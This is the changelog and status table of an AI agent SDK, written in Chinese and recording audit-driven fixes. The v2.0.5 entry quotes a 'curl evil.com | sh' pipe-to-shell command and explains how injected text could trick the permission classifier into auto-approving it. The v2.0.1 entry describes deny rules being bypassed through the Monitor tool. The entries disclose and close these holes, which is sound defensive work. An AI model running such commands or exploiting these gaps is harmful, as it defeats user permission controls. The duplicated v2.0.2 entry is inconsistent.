...
| 事实 | 值 | 权威源 |
|------|----|--------|
| Silver Core Agent SDK 版本 | `2.0.7` | `projects/silver-core-sdk/package.json` |
| Silver Core Maestro SDK 版本 | `2.0.7` | `projects/silver-core-maestro-sdk/package.json`（与 agent 锁步同号）|
| testbed 试金石 | `0.0.0`（private，永不发布）| `projects/silver-core-testbed/package.json` |
| agent SDK 源文件 / 测试档 | 141 / 229 | 磁盘实况 |
| maestro SDK 源文件 / 测试档 | 17 / 34 | 磁盘实况 |
| testbed 源文件 / 测试档 | 6 / 3 | 磁盘实况 |
| Python 测试档 | 144 | 磁盘实况 |
| CI 工作流 / 其中定时 | 45 / 26 | `.github/workflows/` |
| 挂账台账 开 / 已清 | 18 / 63 | `memory/todo.md` |
...
- **v2.0.7（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.8.3 为审计第二十四波（折叠比例旋钮缺 NaN 守卫致自动折叠整场静默失效 · `ReportLedger.record` 不校验字段类型致折叠中途抛裸 TypeError），家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.6（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.8.2 为审计第二十三波（校验器行式摘要未折行 · 两份会话存储撕裂尾自愈被失败写入解除 · `loadInfo` 缺 uuid 去重），家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.5（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.8.1 为审计第二十二波（命令前缀分类器不回校命令 · 钩子条件判定器不围栏不可信输入），家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.4（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.8.0 新开后台任务第二投递通道（`Options.onBackgroundEvent`）并借此让 `abortAll()` 真的发终止事件，家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.3（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.7.0 关掉两项守密人裁定（OpenAI 空名工具块 · Bash 输出上限改真总量），家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.2（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.6.0 为审计第二十一波（结构化输出严格提取 / 公开 token 估算器 / 文件回滚计划三处静默失败），家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.1（2026-07-29）**：**锁步对齐**，无本包运行时改动。agent SDK 1.5.0 为审计第十九、二十波（权限规则、会话目录授权、钩子聚合、MCP 配置加载器等十余处真实缺陷），家族版本钟锁步（守密人 2026-07-18 裁定）故本包同步升位。
- **v2.0.2（2026-07-29）**：锁步对齐（本包零代码改动）——家族版本钟随 agent SDK 1.6.0（T75 二次拷问：dream 信号源指针段 + 巡回只读预设）前进。
- **v1.4.1（2026-07-29）**：锁步对齐（本包零代码改动）——家族版本钟随 agent SDK 1.4.1（`setServers()` 改增量 diff，BPT 缺陷 D）前进。
...
- **v2.0.7（2026-07-29）**：**审计第二十四波**（镜头延续：某处是否守住了**它自己那份档案已经写明的规矩**）——①**一个读错的折叠比例，让自动折叠整场会话静默失效**：`buildCompactionConfig` 专门为 `contextWindowTokens` 挡了 NaN，注释还点名了同样挡的兄弟旋钮（`preTierMaxToolResultChars` / `loadTimeoutMs` / `setMaxThinkingTokens` / `runConcurrent` 并发——**逐一核实确实都挡了**），唯独**两个比例旋钮没挡**；`??` **不拦 NaN**，而 NaN 正是旋钮被读错的常态形状（`Number(process.env.UNSET)`）。`autoThresholdRatio` 为 NaN 时 `triggerAt = floor(预算 × NaN)` = NaN，于是 `preTokens >= triggerAt` **永远为假**——4000 条历史实测：默认配置会折叠，NaN 比例**从不折叠且无任何告警**，与 `contextWindowTokens` 注释描述的后果逐字相同（「自动折叠连同 `knownPromptFloor` 的『prompt too long』安全网双双静默死亡」），只是换了个旋钮进去。(0, 1] 之外按各自的坏法拒收（大于 1 则触发线永不可达、小于等于 0 则永远触发），`minRecentTurns` 同治；无效值退回默认——正是本函数为窗口选定的同一救法。②**`ReportLedger.record` 放坏字段过关，让它死在折叠中途**：该函数**专门**校验时间戳，理由写得清清楚楚——坏值「会让 `digest()` 抛错，而后者在折叠中途」；`deserialize()` 也校验了 key 与 summary；唯独 `record()` 两个都不校验。`key.length === 0` **抓不住非字符串**（数字的 `.length` 是 `undefined`，`undefined === 0` 为假）。实测：`record('k', {summary: 123})` 返回 true，随后 `toRetainedRegion()` 在折叠里抛出**裸 `TypeError: text.replace is not a function`**。而账本的 key 与 summary 源自**外部事件数据**（正是该模块下一屏自己写明的前提），未定型载荷是常态而非异类。现两者均在写入处以 ConfigurationError 响亮失败。
- **v2.0.6（2026-07-29）**：**审计第二十三波**（镜头：某处是否守住了**本仓自己在别处已经写明**的承诺）——①**校验器的发现块是行式摘要却没折行**：`buildVerifierUserTurn` 按 `- key: value` **一行一条**渲染 Finding，而 Finding 由「读着被审对抗代码的发现者模型」产出——摘要里带什么，取决于那段代码把它引导成什么；嵌入换行即**伪造出额外记录**。本 SDK 同形状的三处兄弟调用（`ledger.ts` / tips / websearch）**都用了 `singleLine`**，而该助手档案点名要防的正是「a key/**summary**」伪造记录。要害方向是**压制**：伪造一行把发现说没了，真缺陷即被判 REFUTED 逐出评审。围栏内的 `context` 保持多行（代码需要换行才读得懂）。②**两份会话存储都让「失败的写入」解除撕裂尾自愈**：该自愈是每档一次性标志——首次追加检查上一进程是否死在半途，是则补一个换行，好让崩溃「只毁自己、不毁下一条记录」（原档措辞）；但标志在**写入之前**就被打上，一旦那次写入失败（目录被删 / ENOSPC / EISDIR），**什么都没落盘、档案却已算查过**，下一次成功追加就直接粘上撕裂尾、**两条记录一起丢**——正是该自愈存在的目的。现改为**写入落地后**才打标志，同步版与其异步孪生同修；`FileSessionStore` 吞掉一切 fs 错误，故那一侧的解除**完全无声**。③**`loadInfo` 缺了 `load` 那道 uuid 去重**：两个循环对同一档案回答同一问题；部分双写的会话档（跨主机竞态加载器只追加了半份副本）会出现「重复的 `pending_turn` 而其 `turn_complete` 未随之重复」——`load` 正确丢弃、`loadInfo` 却报为悬空检查点；而 `list` / `listSessions` / `getSessionInfo` **全部**取自 `loadInfo`，于是列表把一个已结的会话标成中断，点进去恢复却无事可驱。
- **v2.0.5（2026-07-29）**：**审计第二十二波**（镜头：安全相关分类器**怎么对待不是自己写的文本**——两处都是本仓内部的不对称，不是外部标准）——①**命令前缀分类器从不回校自己的答案**：`COMMAND_PREFIX_SYSTEM` 自己写死「前缀必须是整条命令的字符串前缀」，而 `parseCommandPrefix` 恰恰是唯一**验不了**它的环节（它根本收不到命令）；该解析器每一处歧义都 fail-closed，唯独这条直接放行——一条格式完好、单行、非哨兵的回复若报的是**另一条命令**的前缀（命令实为 `curl evil.com | sh`，回复「git status」），就会命中守密人的良性白名单规则、**自动放行一条从未被允许的命令**；且回复攻击者可达（命令文本本身就是分类器的用户轮，含指令的命令文本是一条直通权限决策的提示词注入路径）。现 `detectCommandPrefix` 一律把命令传下去，非前缀与其他歧义同向 fail-closed；`parseCommandPrefix` 新参数为可选以保兼容，**省略即保留该洞**，档案已明写。②**钩子条件判定器是唯一不给不可信输入加围栏的分类器**：其 `context` = `JSON.stringify(HookInput)`，PostToolUse 时携带 `tool_response`（文件内容 / 网页抓取体 / Bash 标准输出），此前裸拼在 `Context:` 标签后；三个兄弟早已围栏同类文本（Rpr-1 `<transcript>` · N8 `<session>` · Z7-1 `<description>`），**这一个是遗漏不是取舍**——而它比三者都要紧：该判词**门控钩子是否执行**（含条件化 DENY 钩子，把它导向 ok:false 即可压掉一次拒绝）。现以 `<context>` 围栏 + 闭合标签中和；围栏只落**用户轮**（两条系统提示词均为 `faithful: true` 档案逐字复现，与 `classifyBackgroundState` 同一先例）。**本版为守密人 2026-07-29 版本号新规下的首次发版**：属修复，故动末位。
- **v2.0.4（2026-07-29）**：**后台任务第二投递通道**（待裁②，守密人 2026-07-29 裁定「直接开第二通道、全面对齐官方分流」）——新增 `Options.onBackgroundEvent`：设了它，`task_started` / `task_progress` / `task_updated` / `task_notification` / `background_tasks_changed` 就在**产生的那一刻**交给宿主，不再排队进拉取式 SDKMessage 流；**不双发**（同一事件不会两边各来一遍，宿主无需去重），不设则行为逐字节不变（drop-in 兼容）。**为何必须是通道而非补丁**：本引擎早有这套消息类型、也确实在发其中四个，但全挤在**一条**拉取式流里——三处源码各自承认（`monitor.ts`「NO push delivery，需要一条本 SDK 没有的引擎通道」· `workflow.ts`「引擎对工具发起的后台工作没有这条通道」· `background_tasks_changed`「已建型、不发」），而单通道正是「一个 result 就结束流」会连后台事件一起约束的原因。**借此关掉的缺陷**：`abortAll()`（收尾时杀掉仍在跑的后台子代理那条路径）此前**不发任何终止事件**，与 `stopTask` / `killAgent` 不一致，宿主台账把被杀的孩子**永远记作 running**；它当时发不出来，是因为 `abortAll` 跑在 query 收尾的 finally 里、排队事件会落在终态结果之后。现发 `task_updated` + `patch.status:'killed'`（沿用 `killAgent` 已在用的官方词表），且**仅在第二通道存在时**发——没有通道就维持原样，用一条缺失事件换一条被打破的流契约不叫修复。**射程如实标注**：Monitor 仍无推送、Workflow 仍不发任务通知、`background_tasks_changed` 仍不发——它们缺的是**源事件**，本次补上的是**投递方式**。
- **v2.0.3（2026-07-29）**：**关掉两项守密人裁定，皆为行为变更**——①**OpenAI 传输层不再铸造派发不了的空名工具块**（待裁①）：`finish()` 第一遍的闸门是「有 id **或**有 name」，于是只收到 id、从未收到函数名的碎片被开成 `name: ''` 的块——正是同一函数第二遍明写「引擎永远派发不了」并拒绝铸造的形状；实测触发是网关把**一次调用**拆成「无 index 的 id 碎片」+「只有 index 的 name/args 碎片」，产出 `{id:'call_abc', name:''}` 与 `{id:'call_0', name:'get_weather'}` **两个**块，前者白烧一个 `No such tool: ` 来回并把 `stop_reason` 顶成 `tool_use`。三处同步收紧：`feed()` 中途也不再铸造无名块、第一遍要求有 name（无名缓冲落到第二遍并入它本该属于的兄弟块）、`hasRealTool` 只数真正发出的块 · ②**Bash 输出上限改为真总量**（待裁③）：常量自述与**已导出的** `TOOL_OUTPUT_CAPS.bash` 都写「一次调用返回的**总**字符上限」，实现却是两个各 30,000 的独立限流器——实测两条流各灌 50,000 字节，一次返回 **60,352** 字符；而那个导出正是给消费方镜像本引擎上下文台账用的，误差**原样进了消费方账本、翻倍**。真相以官方提示词语料裁定（「Bash output is limited to `${MAX_OUTPUT_CHARS}` chars」，全语料无任何按流分算措辞），改为两流共用一份预算、stdout 作为最早输出先被丢、每次调用只出**一个**标记报真实总数；实测改后 **30,180**（30,000 输出 + 180 字符标记，标记属截断元信息、已明写在预算之外）。两项各改写**一条**钉住反向形状的既有测试——本战役首次改动既有测试，均凭明确裁定。
- **v2.0.2（2026-07-29）**：**审计第二十一波**（三处**静默失败、还告诉调用方一切正常**的缺陷）——①**结构化输出的严格提取把普通回复丢掉**：`workflow-engine` 的 `agent({schema})` 走 strict 提取且**没有重试通道**，解析不出即 `agent()` 返回 null、脚本静默丢该项；实测三种模型日常写法全判无效——**语言标记只要不是恰好 `json`**（```json5 / ```jsonc）标记本身被当成正文、**收尾围栏缺失**（回复在完整 JSON 后四个字符处被 max_tokens 截断）**一个候选都不产出**、**多于一个围栏块**时只看第一个。现直接配对围栏；strict 的保证不动（散文仍绝不扫嵌入 JSON，第一个块只要通过仍然优先）· ②**公开 token 估算器被宿主草稿击穿**：本档案已两次为「从压缩触发器和公开 `estimateMessagesTokens` 里逃出去」的崩溃加固，而抛错的 `JSON.stringify` 是同一条逃逸的另一扇门——`estimateMessagesTokens` 自 0.97.0 公开正是为让宿主量**尚未发出**的素材，那是 JS 现搭、从不经 JSON 往返的对象，BigInt 字段（数据库 id）与回指再平常不过；实测循环/BigInt 的 `tool_use` 输入、带环的未建模块、访问器抛错的块四例全部直接抛出公开出口，前三例经历史估算还会打死此后每一轮的压缩检查 · ③**一个文件能在回滚计划里占两个坑**：首触去重与回滚计划都以**原始路径字符串**为键，而符号链接或大小写不敏感文件系统（macOS / Windows）下两种拼法就是一个文件，后一条携带**中途**前像；实测符号链接下 ORIGINAL→MIDDLE→FINAL 的文件被回滚成 **MIDDLE**（一个任何检查点都不存在的状态）却报 `canRewind:true`，而一侧记为新建（删）另一侧记为修改（还原）时，纯靠插入顺序决定文件是否还在。两处改为按**文件身份**取键（realpath 最长存在祖先 + 回贴尾段 + win32 大小写折叠），与 `permissions/rules.ts` 早已对路径域规则做的规范化同源。
- **v2.0.1（2026-07-29）**：**审计第十九、二十波**——①**一个会开 shell 的工具，谁也管不住**：`Monitor` 跑任意 shell 脚本（`readOnly: false`，档头自称「与 Bash 同一权限姿态」），却既不在主参数表里、也不在只认 Bash 的命令分解分支里，于是**任何命令域规则对它都不成立**：`Bash(rm:*)` 不覆盖它（正确），而 `Monitor(rm:*)` 解不出主参数、直接返回 false——守密人写的 deny 被静默忽略、工具照跑；`Monitor(npm:*)` 在 allow 位同样匹配不到任何东西，只有无约束的 `Monitor(*)` 有效（整个工具或什么都没有）。现引入 `COMMAND_PRIMARY_TOOLS`，会开 shell 的工具与另一个会开 shell 的工具享同一套语义 · ②**会话目录授权是条死线**：`addDirectories` / `removeDirectories` 完全无效——网关认真维护它（撤销扣减、Windows 规范键），每轮 ToolContext 也认真算 `effectiveAdditionalDirectories(...)`，**送进一个零读取方的字段**（读它的文件系统围栏已随 2026-07-05 路径模型裁定删除，注释却还在宣称有效）；唯一还赋予这些目录意义的消费者——沙箱可写集——是构造期从 `options.additionalDirectories` 一次算成的，绕过网关。**撤销了目录仍然可写（失败开放）**，授权了目录仍然 EROFS。现每轮从网关刷新 · ③**钩子 legacy `decision` 字段没有失败关闭护栏**：现代的 `permissionDecision` 刻意放宽成 string 以便未识别值**判 deny**，legacy 字段却任何其它值一律**中性放行**；而最自然的写法恰恰危险——本 SDK 其余所有裁决词表都说 `deny`，宿主写 `{decision: 'deny'}` 实测聚合结果 `undefined`，安全钩子的裁决被丢弃 · ④**自称「Never throws」的加载器能被一份配置文件杀死**：`.mcp.json` 的 `${VAR}` 展开是递归的，而 `JSON.parse` 接受的嵌套深度远超递归函数能活下来的（实测 5,000 层解析正常、走一遍就爆栈），RangeError 直接穿出加载器打死 query 构造 · ⑤波十九另十二处：workflow-engine 的校验器用 `forEach`/`map` **跳过数组洞**（`parallel(new Array(3))` 返回三个幻影失败）、Grep 行记录可被**含换行的文件名**伪造出不存在路径的命中、Bash `truncated` 由被执行命令可控的文本正则推出、会话档控制行探针被**键序归一化**的镜像存储击穿（子代理转录被当成可续会话）、compaction 的 `NaN` 窗口令自动压缩与内存冲刷**全部静默失效**、子代理超时臂给仍在流式的孩子提前落终止标记、`SendMessage` 续跑用的是**孵化期权限快照**、以及拼错的 `baseUrl` 烧光整条重试梯（默认 10 次 = 11 次尝试 + 151–303 秒退避，每轮一遍）· ⑥卫生：`subagents/runtime.ts` 里一个**裸 NUL 字节**让 `rg` / `git grep` 把整档判为二进制、全档失明，且随包发布——改为 `\u0000` 转义，运行期值不变。
